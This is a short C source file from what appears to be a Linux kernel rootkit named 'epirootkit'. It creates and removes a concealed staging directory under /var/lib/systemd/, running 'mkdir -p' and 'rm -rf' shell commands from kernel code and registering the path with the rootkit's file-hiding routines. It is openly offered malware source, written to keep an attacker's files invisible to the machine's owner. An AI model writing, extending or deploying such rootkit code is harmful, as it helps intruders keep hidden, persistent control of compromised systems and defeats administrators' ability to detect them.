#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/namei.h>

#include "epirootkit.h"

#define HIDDEN_DIR_NAME ".epirootkit-hidden-fs"
#define HIDDEN_DIR_PATH "/var/lib/systemd/" HIDDEN_DIR_NAME

int create_hidden_tmp_dir(void) {
    char cmd[128];
    int rc;

    // Compose the mkdir command
    snprintf(cmd, sizeof(cmd), "mkdir -p -- %s", HIDDEN_DIR_PATH);
    rc = exec_str_as_command(cmd, false);

    // Hide it
    add_hidden_dir(HIDDEN_DIR_PATH);

    return SUCCESS;
}

int remove_hidden_tmp_dir(void) {
    char cmd[128];
    int rc;

    // Compose the rm -rf command
    snprintf(cmd, sizeof(cmd), "rm -rf %s", HIDDEN_DIR_PATH);
    rc = exec_str_as_command(cmd, 0);

    // Unhide directory
    remove_hidden_dir(HIDDEN_DIR_PATH);

    return SUCCESS;
}
